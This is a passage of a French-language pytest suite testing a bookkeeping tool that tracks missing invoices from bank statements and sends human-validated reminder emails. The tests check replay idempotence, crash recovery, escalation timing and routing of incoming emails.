"""Tests de bout en bout de l'assemblage (src/rapprochement/cycle.py, scripts/cycle.py).

Les tests marques `xfail(strict=True)` reproduisent des defauts ou contradictions
trouves dans les modules des autres experts : ils deviendront rouges le jour ou
le defaut sera corrige (il faudra alors retirer le marqueur).
"""

from __future__ import annotations

import csv
import datetime as dt
import hashlib
import os
import importlib.util
import shutil
import sys
import time
from decimal import Decimal
from email.message import EmailMessage
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

RACINE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RACINE / "src"))

from rapprochement import cycle, envoi, etats, relances  # noqa: E402
from rapprochement.audit import JournalAudit  # noqa: E402
from rapprochement.cadence import planifier  # noqa: E402
from rapprochement.depot import Depot  # noqa: E402
from rapprochement.modeles import (  # noqa: E402
    Brouillon,
    Dossier,
    EtatPeriode,
    EtatPiece,
    Evenement,
    MotifNonRoute,
    OperationBancaire,
    PieceAttendue,
    Sens,
    StatutBrouillon,
    StatutRoutage,
    identifiant_relance,
)
from rapprochement.moteur import Moteur  # noqa: E402
from rapprochement.parseurs import lire_releve  # noqa: E402

PARIS = ZoneInfo("Europe/Paris")
J0 = dt.date(2026, 10, 5)            # lundi
RELAIS = "pieces@cabinet-relais.fr"
VALIDEUSE = "Marie Durand"


def a_10h(jour: dt.date) -> dt.datetime:
    return dt.datetime.combine(jour, dt.time(10, 0), tzinfo=PARIS)


def jour(n: int) -> dt.date:
    return J0 + dt.timedelta(days=n)


# ---------------------------------------------------------------------------
# Corpus construit
# ---------------------------------------------------------------------------

DOSSIERS = [
    ["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
    ["BETA", "Beta SAS", "contact@beta-sas.fr", "Mme Beta", "20", "courtois", "C-RELAIS", RELAIS],
    ["GAMMA", "Gamma EURL", "gerant@gamma-eurl.fr", "M. Gamma", "20", "courtois", "C-RELAIS", RELAIS],
]
OPERATIONS = [
    ["ALPHA", "2026-09-03", "CB LOXAM LOCATION", "120.00", "A-001"],
    ["ALPHA", "2026-09-17", "PRLV ORANGE PRO", "59.90", "A-002"],
    ["ALPHA", "2026-08-12", "CB BUREAU VALLEE", "75.50", "A-003"],
    ["ALPHA", "2026-09-30", "PRLV URSSAF", "812.00", "A-004"],
    ["BETA", "2026-09-10", "CB METRO CASH", "230.40", "B-001"],
    ["GAMMA", "2026-09-11", "CB CASTORAMA", "145.00", "G-001"],
]
REFS_MANQUANTES = ("A-001", "A-002", "A-003", "B-001", "G-001")


def ecrire_entree(rep: Path, *, operations=OPERATIONS, dossiers=DOSSIERS, pieces=(),
                  exclusions=None) -> Path:
    rep.mkdir(parents=True, exist_ok=True)
    with open(rep / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact",
                    "jour_echeance_tva", "ton_relance", "circuit", "email_relais"])
        w.writerows(dossiers)
    with open(rep / "releve_bancaire.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "date_operation", "date_valeur", "libelle", "debit", "credit",
                    "devise", "reference"])
        for d, date, lib, montant, ref in operations:
            w.writerow([d, date, date, lib, montant, "", "EUR", ref])
    with open(rep / "pieces_recues.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["id_piece", "dossier", "fichier", "fournisseur", "date_facture", "montant_ttc",
                    "devise", "date_reception", "canal"])
        w.writerows(pieces)
    if exclusions is not None:
        with open(rep / "exclusions_dossier.csv", "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["dossier", "motif_regex", "motif"])
            w.writerows(exclusions)
    elif (rep / "exclusions_dossier.csv").exists():
        (rep / "exclusions_dossier.csv").unlink()
    return rep


def nouvelle_instance(rep: Path, validateurs: str | None = f"{VALIDEUSE}\nPaul Martin\n") -> cycle.Instance:
    inst = cycle.Instance(rep)
    inst.preparer()
    if validateurs is not None:
        inst.validateurs.write_text(validateurs, encoding="utf-8")
    return inst


def ecrire_eml(rep: Path, nom: str, *, expediteur: str, message_id: str, corps: str = "",
               objet: str = "Justificatif", fichiers: tuple[tuple[str, bytes], ...] = ()) -> Path:
    msg = EmailMessage()
    msg["From"] = expediteur
    msg["To"] = "pieces@cabinet.invalid"
    msg["Subject"] = objet
    msg["Message-ID"] = message_id
    msg["Date"] = "Wed, 07 Oct 2026 09:00:00 +0200"
    msg.set_content(corps)
    for nom_f, contenu in fichiers:
        msg.add_attachment(contenu, maintype="application", subtype="pdf", filename=nom_f)
    chemin = rep / nom
    chemin.write_bytes(bytes(msg))
    return chemin


@pytest.fixture
def entree(tmp_path: Path) -> Path:
    return ecrire_entree(tmp_path / "entree")


@pytest.fixture
def inst(tmp_path: Path) -> cycle.Instance:
    return nouvelle_instance(tmp_path / "instance")


def lire_csv(chemin: Path) -> list[dict[str, str]]:
    with open(chemin, encoding="utf-8", newline="") as f:
        return list(csv.DictReader(f))


def lancer(entree: Path, inst: cycle.Instance, d: dt.date, **kw) -> cycle.ResumeCycle:
    return cycle.executer_cycle(entree, inst, d, a_10h(d), **kw)


def pieces_par_ref(inst: cycle.Instance) -> dict[str, PieceAttendue]:
    return {p.reference: p for p in cycle.pieces(inst)}


def valider_et_envoyer(inst: cycle.Instance, d: dt.date) -> list[Brouillon]:
    envoyes = []
    for b in cycle.brouillons(inst, StatutBrouillon.BROUILLON):
        cycle.valider_relance(inst, b.id_relance, "marie DURAND", maintenant=a_10h(d))
        envoyes.append(cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(d)))
    return envoyes


def emls(inst: cycle.Instance) -> list[str]:
    return sorted(p.name for p in inst.outbox.glob("*.eml"))


def empreintes(racine: Path, *noms: str) -> dict[str, str]:
    resultat = {}
    for nom in noms:
        base = racine / nom
        fichiers = [base] if base.is_file() else sorted(p for p in base.rglob("*") if p.is_file())
        for f in fichiers:
            resultat[str(f.relative_to(racine))] = hashlib.sha256(f.read_bytes()).hexdigest()
    return resultat


def etat_depot(inst: cycle.Instance) -> tuple:
    with Depot(inst.depot) as d:
        return (
            d.charger_pieces(),
            d.lister_brouillons(),
            d.file_humaine(resolue=None),
            d.historique_envois(),
        )


def charger_cli():
    spec = importlib.util.spec_from_file_location("cli_cycle", RACINE / "scripts" / "cycle.py")
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


# ---------------------------------------------------------------------------
# Premier cycle : pieces, brouillons, aucune emission
# ---------------------------------------------------------------------------


def test_premier_cycle_cree_pieces_et_brouillons(entree, inst):
    resume = lancer(entree, inst, J0)
    pieces = pieces_par_ref(inst)
    assert sorted(pieces) == list(REFS_MANQUANTES)
    assert all(p.etat is EtatPiece.ATTENDUE and p.nb_relances == 0 for p in pieces.values())
    assert resume.pieces_creees == 5 and resume.brouillons_crees == 2
    bs = cycle.brouillons(inst)
    assert {b.destinataire for b in bs} == {"compta@alpha-sarl.fr", RELAIS}
    assert all(b.statut is StatutBrouillon.BROUILLON and b.valide_par == "" for b in bs)
    for nom in ("tableau_suivi.csv", "pieces_attendues.csv", "a_verifier.csv",
                "file_humaine.csv", "periodes.csv", "resume.txt"):
        assert (inst.sortie / nom).exists(), nom
    assert sorted(p.stem for p in (inst.sortie / "brouillons").glob("*.txt")) == sorted(
        b.id_relance for b in bs)
    assert JournalAudit(inst.audit).verifier().ok
    actions = [e.action for e in JournalAudit(inst.audit).lire()]
    assert actions.count("piece_creee") == 5 and actions.count("brouillon_cree") == 2
    assert actions[-1] == "cycle_termine"


def test_ca06_aucun_envoi_sans_validation(entree, inst):
    lancer(entree, inst, J0)
    bs = cycle.brouillons(inst)
    assert bs and emls(inst) == []
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, bs[0].id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(inst, bs[0].id_relance, "Mallory", maintenant=a_10h(J0))
    assert emls(inst) == []
    assert all(b.statut is StatutBrouillon.BROUILLON for b in cycle.brouillons(inst))


@pytest.mark.parametrize("contenu", [None, "", "\n  \n# commentaire\n", "systeme\n"])
def test_validateurs_absents_ou_vides_refus(entree, tmp_path, contenu):
    inst = nouvelle_instance(tmp_path / "i", validateurs=contenu)
    lancer(entree, inst, J0)
    b = cycle.brouillons(inst)[0]
    nom = "systeme" if contenu == "systeme\n" else VALIDEUSE
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(inst, b.id_relance, nom, maintenant=a_10h(J0))
    for appel in (
        lambda: cycle.rejeter_relance(inst, b.id_relance, nom, "x", maintenant=a_10h(J0)),
        lambda: cycle.trancher_envoi(inst, b.id_relance, nom, parti=True, maintenant=a_10h(J0)),
        lambda: cycle.rattacher_piece(inst, nom, maintenant=a_10h(J0), dossier="ALPHA",
                                      reference="A-001", id_piece="P"),
        lambda: cycle.controler_piece(inst, "ALPHA", "A-001", nom, conforme=True, maintenant=a_10h(J0)),
    ):
        with pytest.raises(cycle.ValidateurRefuse):
            appel()


def test_ca06_cli(entree, inst):
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["cycle", *base, "--entree", str(entree)]) == 0
    ids = [b.id_relance for b in cycle.brouillons(inst)]
    assert emls(inst) == []
    assert cli.main(["envoyer", *base, ids[0]]) == 1                       # pas valide
    assert cli.main(["valider", *base, "--par", "Mallory", ids[0]]) == 1   # hors liste
    with pytest.raises(SystemExit):
        cli.main(["valider", *base, ids[0]])                               # --par absent
    assert emls(inst) == []
    assert cli.main(["valider", *base, "--par", "paul martin", ids[0]]) == 0
    assert cli.main(["envoyer", *base, ids[0]]) == 0
    assert cli.main(["envoyer", *base, ids[0]]) == 1
    assert len(emls(inst)) == 1
    assert cli.main(["file", *base]) == 0
    assert cli.main(["verifier-audit", *base]) == 0
    assert cli.main(["exporter", *base, "--vers", str(inst.racine / "export.json")]) == 0


# ---------------------------------------------------------------------------
# CA-05 : rejeu et zero doublon d'envoi
# ---------------------------------------------------------------------------


def test_ca05_rejeu_meme_jour_memes_brouillons(entree, inst):
    r1 = lancer(entree, inst, J0)
    ids1 = sorted(b.id_relance for b in cycle.brouillons(inst))
    r2 = lancer(entree, inst, J0)
    ids2 = sorted(b.id_relance for b in cycle.brouillons(inst))
    assert ids1 == ids2 and len(ids1) == 2
    assert sorted(r1.brouillons_du_jour) == sorted(r2.brouillons_du_jour) == ids1
    assert r2.brouillons_crees == 0 and r2.pieces_creees == 0


def test_ca05_envoyer_deux_fois_un_seul_eml(entree, inst):
    lancer(entree, inst, J0)
    b = cycle.brouillons(inst)[0]
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    assert emls(inst) == [f"{b.id_relance}.eml"]
    lancer(entree, inst, J0)
    assert len(cycle.brouillons(inst)) == 2 and len(emls(inst)) == 1
    nb = {r: p.nb_relances for r, p in pieces_par_ref(inst).items() if r in b.references}
    assert set(nb.values()) == {1}


# ---------------------------------------------------------------------------
# CA-07 : chaque ligne d'un brouillon vient d'une operation du releve
# ---------------------------------------------------------------------------


def _ligne_attendue(op: OperationBancaire) -> str:
    montant = f"{op.montant:,.2f}".replace(",", " ").replace(".", ",")
    return f"  - {op.date_operation.strftime('%d/%m/%Y')}  {montant} {op.devise}  -  {op.libelle_court}"


def verifier_ca07(entree: Path, inst: cycle.Instance) -> int:
    ops = {o.reference: o for o in lire_releve(entree / "releve_bancaire.csv")}
    total = 0
    bs = cycle.brouillons(inst)
    assert bs
    for b in bs:
        lignes = [l for l in b.corps.splitlines() if l.startswith("  - ")]
        attendues = sorted(_ligne_attendue(ops[r]) for r in b.references)
        assert sorted(lignes) == attendues, b.id_relance
        for r in b.references:
            assert ops[r].dossier in b.dossiers
        total += len(lignes)
    return total


def test_ca07_lignes_reliees_au_releve(entree, inst):
    lancer(entree, inst, J0)
    assert verifier_ca07(entree, inst) == 5


# ---------------------------------------------------------------------------
# CA-08 : reproductibilite octet pour octet
# ---------------------------------------------------------------------------


def _scenario_complet(entree: Path, inst: cycle.Instance, eml_source: Path) -> None:
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    shutil.copytree(eml_source, inst.entrant, dirs_exist_ok=True)
    lancer(entree, inst, jour(2))
    lancer(entree, inst, jour(7))


def test_ca08_deux_instances_sorties_identiques(entree, tmp_path):
    emls_src = tmp_path / "emls"
    emls_src.mkdir()
    ecrire_eml(emls_src, "01.eml", expediteur="compta@alpha-sarl.fr", message_id="<m1@alpha>",
               corps="Montant : 120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF-1"),))
    ecrire_eml(emls_src, "02.eml", expediteur="inconnu@gmail.com", message_id="<m2@x>",
               fichiers=(("x.pdf", b"%PDF-2"),))
    i1 = nouvelle_instance(tmp_path / "i1")
    i2 = nouvelle_instance(tmp_path / "i2")
    _scenario_complet(entree, i1, emls_src)
    _scenario_complet(entree, i2, emls_src)
    e1 = empreintes(i1.racine, "sortie", "outbox", "audit.jsonl")
    e2 = empreintes(i2.racine, "sortie", "outbox", "audit.jsonl")
    assert len(e1) > 10 and e1 == e2
    assert etat_depot(i1) == etat_depot(i2)


# ---------------------------------------------------------------------------
# CA-10 : reprise apres panne
# ---------------------------------------------------------------------------


class Panne(RuntimeError):
    pass


def _reference(entree: Path, tmp_path: Path) -> tuple[cycle.Instance, dict, tuple]:
    ref = nouvelle_instance(tmp_path / "reference")
    lancer(entree, ref, J0)
    return ref, empreintes(ref.racine, "sortie"), etat_depot(ref)


@pytest.mark.parametrize("point", [
    "apres_repercussion", "apres_pieces", "apres_routage", "apres_transitions",
    "apres_brouillon", "avant_sorties",
])
def test_ca10_panne_au_milieu_du_cycle_puis_reprise(entree, tmp_path, point):
    _, sorties_ref, depot_ref = _reference(entree, tmp_path)
    inst = nouvelle_instance(tmp_path / "panne")

    def panne(p: str) -> None:
        if p == point:
            raise Panne(p)

    with pytest.raises(Panne):
        lancer(entree, inst, J0, panne=panne)
    lancer(entree, inst, J0)
    # resume.txt decrit les effets du cycle courant (0 piece creee a la reprise) : exclu.
    sans_resume = {k: v for k, v in empreintes(inst.racine, "sortie").items() if "resume" not in k}
    assert sans_resume == {k: v for k, v in sorties_ref.items() if "resume" not in k}
    assert etat_depot(inst) == depot_ref
    assert JournalAudit(inst.audit).verifier().ok


def test_ca10_panne_dans_sauver_brouillon(entree, tmp_path, monkeypatch):
    _, _, depot_ref = _reference(entree, tmp_path)
    inst = nouvelle_instance(tmp_path / "panne")
    original = Depot.sauver_brouillon
    appels = {"n": 0}

    def sauver_en_panne(self, b):
        appels["n"] += 1
        if appels["n"] == 2:
            raise Panne("disque plein")
        return original(self, b)

    monkeypatch.setattr(Depot, "sauver_brouillon", sauver_en_panne)
    with pytest.raises(Panne):
        lancer(entree, inst, J0)
    assert len(cycle.brouillons(inst)) == 1
    monkeypatch.setattr(Depot, "sauver_brouillon", original)
    lancer(entree, inst, J0)
    lancer(entree, inst, J0)
    assert etat_depot(inst) == depot_ref                     # aucune piece perdue, aucun doublon
    valider_et_envoyer(inst, J0)
    lancer(entree, inst, J0)
    assert len(emls(inst)) == 2 and len(cycle.brouillons(inst)) == 2
    assert all(p.nb_relances == 1 for p in cycle.pieces(inst))


def test_ca10_panne_entre_envoi_effectif_et_repercussion(entree, inst):
    lancer(entree, inst, J0)
    b = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    def panne(p: str) -> None:
        if p == "apres_envoi":
            raise Panne(p)

    with pytest.raises(Panne):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), panne=panne)
    assert emls(inst) == [f"{b.id_relance}.eml"]
    assert cycle.brouillons(inst, StatutBrouillon.ENVOYEE)[0].id_relance == b.id_relance
    assert all(pieces_par_ref(inst)[r].etat is EtatPiece.ATTENDUE for r in b.references)

    resume = lancer(entree, inst, J0)                         # reprise
    assert resume.envois_repercutes == 1
    pieces = pieces_par_ref(inst)
    for r in b.references:
        assert pieces[r].etat is EtatPiece.DEMANDEE and pieces[r].nb_relances == 1
        assert pieces[r].date_premiere_demande == J0
    assert [x.id_relance for x in cycle.brouillons(inst)
            if set(x.references) & set(b.references)] == [b.id_relance]   # pas de nouveau brouillon
    assert lancer(entree, inst, J0).envois_repercutes == 0   # idempotent
    assert all(pieces_par_ref(inst)[r].nb_relances == 1 for r in b.references)
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    assert len(emls(inst)) == 1
    repercussions = [e for e in JournalAudit(inst.audit).lire() if e.action == "envoi_repercute"]
    assert len(repercussions) == 1 and repercussions[0].details["valide_par"] == VALIDEUSE


def test_ca10_panne_pendant_la_repercussion_tout_ou_rien(entree, inst, monkeypatch):
    lancer(entree, inst, J0)
    b = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    original = cycle._transition
    vus = {"n": 0}

    def transition_en_panne(piece, evenement, *a, **kw):
        if evenement is Evenement.RELANCE_ENVOYEE:
            vus["n"] += 1
            if vus["n"] == 2:
                raise Panne("crash au milieu de la repercussion")
        return original(piece, evenement, *a, **kw)

    monkeypatch.setattr(cycle, "_transition", transition_en_panne)
    with pytest.raises(Panne):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    assert all(pieces_par_ref(inst)[r].nb_relances == 0 for r in b.references)  # rollback complet
    monkeypatch.setattr(cycle, "_transition", original)
    lancer(entree, inst, J0)
    lancer(entree, inst, J0)
    assert all(pieces_par_ref(inst)[r].nb_relances == 1 for r in b.references)
    assert len(emls(inst)) == 1


def test_envoi_incertain_tranche_par_un_humain(entree, inst):
    lancer(entree, inst, J0)
    b = cycle.brouillons(inst)[0]
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))

    class Coupure:
        def envoyer(self, brouillon):
            raise TimeoutError("SMTP muet")

    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0), expediteur=Coupure())
    assert cycle.brouillons(inst, StatutBrouillon.EN_COURS)[0].id_relance == b.id_relance
    lancer(entree, inst, J0)                                   # le cycle ne renvoie rien
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.trancher_envoi(inst, b.id_relance, "Mallory", parti=True, maintenant=a_10h(J0))
    cycle.trancher_envoi(inst, b.id_relance, "Paul Martin", parti=True, maintenant=a_10h(J0))
    assert all(pieces_par_ref(inst)[r].nb_relances == 1 for r in b.references)
    assert lancer(entree, inst, J0).envois_repercutes == 0


# ---------------------------------------------------------------------------
# Evolution sur plusieurs jours, jusqu'a l'escalade
# ---------------------------------------------------------------------------


def _etats(inst: cycle.Instance) -> set[tuple[EtatPiece, int]]:
    return {(p.etat, p.nb_relances) for p in cycle.pieces(inst)}


def test_evolution_sur_plusieurs_jours_jusqu_a_l_escalade(entree, inst):
    # Jour 0 : demande initiale.
    lancer(entree, inst, J0)
    assert {b.niveau for b in valider_et_envoyer(inst, J0)} == {1}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 1)}
    assert all(p.date_premiere_demande == J0 for p in cycle.pieces(inst))

    # Jour 3 (ouvre) : jalon de 3 jours ouvres atteint, mais garde-fou hebdomadaire.
    r3 = lancer(entree, inst, jour(3))
    assert r3.brouillons_du_jour == [] and r3.reportees == {"LIMITE_HEBDOMADAIRE": 2}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 1)}

    # Jour 7 : relance de niveau 2.
    r7 = lancer(entree, inst, jour(7))
    assert r7.brouillons_crees == 2
    assert {b.niveau for b in valider_et_envoyer(inst, jour(7))} == {2}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 2)}

    # Jour 10 : rien (fenetre hebdomadaire).
    assert lancer(entree, inst, jour(10)).brouillons_crees == 0

    # Jour 14 : relance de niveau 3.
    assert lancer(entree, inst, jour(14)).brouillons_crees == 2
    assert {b.niveau for b in valider_et_envoyer(inst, jour(14))} == {3}
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 3)}

    # Jour 17 : 13 jours ouvres seulement, pas d'escalade, pas de relance.
    r17 = lancer(entree, inst, jour(17))
    assert r17.transitions == 0 and r17.brouillons_crees == 0
    assert _etats(inst) == {(EtatPiece.DEMANDEE, 3)}
    assert lire_csv(inst.sortie / "escalades.csv") == []

    # Jour 18 : 14 jours ouvres depuis la premiere demande -> ESCALADE reelle.
    r18 = lancer(entree, inst, jour(18))
    assert r18.transitions == 5 and r18.brouillons_crees == 0
    assert _etats(inst) == {(EtatPiece.ESCALADEE, 3)}
    escalades = lire_csv(inst.sortie / "escalades.csv")
    assert [(l["dossier"], l["reference"]) for l in escalades] == [
        ("ALPHA", "A-003"), ("ALPHA", "A-001"), ("ALPHA", "A-002"), ("BETA", "B-001"), ("GAMMA", "G-001")]
    assert {
        k: escalades[1][k] for k in ("montant", "libelle", "nb_relances", "date_premiere_demande")
    } == {"montant": "120.00", "libelle": "CB LOXAM LOCATION", "nb_relances": "3",
          "date_premiere_demande": "2026-10-05"}

    # Plus aucune relance ensuite.
    assert lancer(entree, inst, jour(21)).brouillons_crees == 0
    assert len(emls(inst)) == 6
    assert JournalAudit(inst.audit).verifier().ok


def test_brouillon_en_attente_bloque_un_second_brouillon(entree, inst):
    lancer(entree, inst, J0)                                   # jamais valide
    r7 = lancer(entree, inst, jour(7))
    assert r7.brouillons_crees == 0
    assert r7.reportees.get(cycle.BROUILLON_EN_ATTENTE) == 2
    assert len(cycle.brouillons(inst)) == 2


def test_envoyer_refuse_un_second_email_dans_la_semaine(entree, inst):
    lancer(entree, inst, J0)
    b1 = next(b for b in cycle.brouillons(inst) if b.destinataire == "compta@alpha-sarl.fr")
    b2 = Brouillon(
        id_relance=identifiant_relance(b1.destinataire, ("A-002",), 1, J0),
        destinataire=b1.destinataire, objet="Autre", corps="x", dossiers=("ALPHA",),
        references=("A-002",), niveau=1, cree_le=J0,
    )
    with Depot(inst.depot) as d:
        d.sauver_brouillon(b2)
    for b in (b1, b2):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a_10h(J0))
    cycle.envoyer_relance(inst, b1.id_relance, maintenant=a_10h(J0))
    with pytest.raises(cycle.EnvoiRefuse):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a_10h(J0 + dt.timedelta(days=1)))
    assert len(emls(inst)) == 1
    assert pieces_par_ref(inst)["A-002"].nb_relances == 1


# ---------------------------------------------------------------------------
# Piece reclamee puis recue, controle, periode COMPLETE
# ---------------------------------------------------------------------------


def test_piece_reclamee_puis_recue_jusqu_a_periode_complete(entree, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    ecrire_eml(inst.entrant, "01.eml", expediteur="Compta <compta@alpha-sarl.fr>",
               message_id="<f1@alpha>", corps="Ci-joint la facture, montant 75,50 EUR.",
               fichiers=(("bureau_vallee_2026-08-12.pdf", b"%PDF-bv"),))
    r = lancer(entree, inst, jour(2))
    assert r.propositions == 1
    assert pieces_par_ref(inst)["A-003"].etat is EtatPiece.DEMANDEE   # proposition, pas confirmation
    (prop,) = cycle.lister_file(inst)
    assert prop.statut is StatutRoutage.PROPOSEE and prop.reference_operation == "A-003"

    with pytest.raises(cycle.ValidateurRefuse):
        cycle.rattacher_piece(inst, "robot", maintenant=a_10h(jour(2)), message_id=prop.message_id)
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(jour(2)),
                              message_id=prop.message_id, empreinte=prop.empreinte[:8])
    assert p.etat is EtatPiece.RECUE and p.pieces_rattachees
    assert cycle.lister_file(inst) == []
    p = cycle.controler_piece(inst, "ALPHA", "A-003", "Paul Martin", conforme=True,
                              maintenant=a_10h(jour(2)))
    assert p.etat is EtatPiece.VALIDEE

    pieces = cycle.pieces(inst)
    aout = [x for x in pieces if x.dossier == "ALPHA" and x.periode == "2026-08"]
    sept = [x for x in pieces if x.dossier == "ALPHA" and x.periode == "2026-09"]
    assert etats.etat_periode(aout) is EtatPeriode.COMPLETE
    assert etats.etat_periode(sept) is EtatPeriode.EN_COLLECTE

    lancer(entree, inst, jour(7))
    with open(inst.sortie / "periodes.csv", encoding="utf-8") as f:
        lignes = {(l["dossier"], l["periode"]): l["etat"] for l in csv.DictReader(f)}
    assert lignes[("ALPHA", "2026-08")] == "complete"
    assert all("A-003" not in b.references for b in cycle.brouillons(inst) if b.cree_le == jour(7))


def test_controle_non_conforme_relance_de_nouveau(entree, inst):
    lancer(entree, inst, J0)
    cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a_10h(J0), dossier="ALPHA",
                          reference="A-001", id_piece="P-1")
    with pytest.raises(etats.TransitionInterdite):
        cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=False, motif="",
                              maintenant=a_10h(J0))
    p = cycle.controler_piece(inst, "ALPHA", "A-001", VALIDEUSE, conforme=False,
                              motif="illisible", maintenant=a_10h(J0))
    assert p.etat is EtatPiece.DEMANDEE and p.pieces_rattachees == ()


# ---------------------------------------------------------------------------
# Circuit C-RELAIS
# ---------------------------------------------------------------------------


def test_relais_un_seul_email_pour_deux_dossiers(entree, inst):
    lancer(entree, inst, J0)
    (b,) = [b for b in cycle.brouillons(inst) if b.destinataire == RELAIS]
    assert b.dossiers == ("BETA", "GAMMA") and b.references == ("B-001", "G-001")
    assert "Beta SAS" in b.corps and "Gamma EURL" in b.corps
    valider_et_envoyer(inst, J0)
    assert len([n for n in emls(inst) if n.startswith(b.id_relance)]) == 1


def test_relais_jamais_rattache_automatiquement(entree, inst):
    lancer(entree, inst, J0)
    ecrire_eml(inst.entrant, "r.eml", expediteur=RELAIS, message_id="<r1@relais>",
               corps="Facture Metro 230,40 EUR", fichiers=(("metro_2026-09-10.pdf", b"%PDF-m"),))
    r = lancer(entree, inst, jour(1))
    assert r.propositions == 0 and r.non_routees == 1
    (d,) = cycle.lister_file(inst)
    assert d.statut is StatutRoutage.NON_ROUTEE and d.motif is MotifNonRoute.DOSSIER_INCONNU
    assert pieces_par_ref(inst)["B-001"].etat is EtatPiece.ATTENDUE


# ---------------------------------------------------------------------------
# Messages entrants : doublon, sans piece jointe, expediteur inconnu
# ---------------------------------------------------------------------------


def test_messages_entrants_chacun_au_bon_endroit(entree, inst):
    lancer(entree, inst, J0)
    e = ecrire_eml(inst.entrant, "01.eml", expediteur="compta@alpha-sarl.fr", message_id="<d@a>",
                   corps="120,00 EUR", fichiers=(("loxam_2026-09-03.pdf", b"%PDF-l"),))
    shutil.copy(e, inst.entrant / "02.eml")                   # deux e-mails identiques
    ecrire_eml(inst.entrant, "03.eml", expediteur="compta@alpha-sarl.fr", message_id="<vide@a>",
               corps="Je vous envoie ca demain")
    ecrire_eml(inst.entrant, "04.eml", expediteur="quelquun@gmail.com", message_id="<g@g>",
               corps="59,90 EUR", fichiers=(("orange.pdf", b"%PDF-o"),))
    r = lancer(entree, inst, jour(1))
    assert (r.messages_lus, r.propositions, r.non_routees, r.doublons) == (4, 1, 2, 1)
    file = cycle.lister_file(inst)
    assert [(d.statut, d.motif, d.reference_operation) for d in file] == [
        (StatutRoutage.PROPOSEE, None, "A-001"),
        (StatutRoutage.NON_ROUTEE, MotifNonRoute.SANS_PIECE_JOINTE, None),
        (StatutRoutage.NON_ROUTEE, MotifNonRoute.DOSSIER_INCONNU, None),
    ]
    with open(inst.sortie / "file_humaine.csv", encoding="utf-8") as f:
        assert len(list(csv.DictReader(f))) == 3
    r2 = lancer(entree, inst, jour(1))                         # rejeu : aucun effet
    assert (r2.propositions, r2.non_routees, r2.doublons) == (0, 0, 4)
    assert cycle.lister_file(inst) == file
    assert all(p.etat is EtatPiece.ATTENDUE for p in cycle.pieces(inst))


# ---------------------------------------------------------------------------
# Collisions de reference
# ---------------------------------------------------------------------------


def test_collision_de_reference_refuse_le_cycle(tmp_path, inst):
    ops = OPERATIONS + [["BETA", "2026-09-12", "CB LEROY MERLIN", "99.00", "A-001"]]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    with pytest.raises(cycle.CollisionReferences) as exc:
        lancer(entree, inst, J0)
    assert exc.value.collisions == {"A-001": ("ALPHA", "BETA")}
    assert "A-001" in str(exc.value) and "BETA" in str(exc.value)
    assert not inst.depot.exists() and cycle.pieces(inst) == []


def test_collision_entre_releve_et_depot(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    ops = [["BETA", "2026-10-01", "CB LEROY MERLIN", "99.00", "A-002"]]
    entree2 = ecrire_entree(tmp_path / "e2", operations=ops)
    avant = etat_depot(inst)
    with pytest.raises(cycle.CollisionReferences) as exc:
        lancer(entree2, inst, jour(1))
    assert exc.value.collisions == {"A-002": ("ALPHA", "BETA")}
    assert etat_depot(inst) == avant


# ---------------------------------------------------------------------------
# Fusion : une piece connue garde son etat ou sort par l'evenement adequat
# ---------------------------------------------------------------------------


def test_piece_connue_garde_etat_et_compteurs(entree, tmp_path, inst):
    lancer(entree, inst, J0)
    valider_et_envoyer(inst, J0)
    # Le mois suivant, le releve ne contient plus que de nouvelles operations.
    entree2 = ecrire_entree(tmp_path / "e2", operations=[
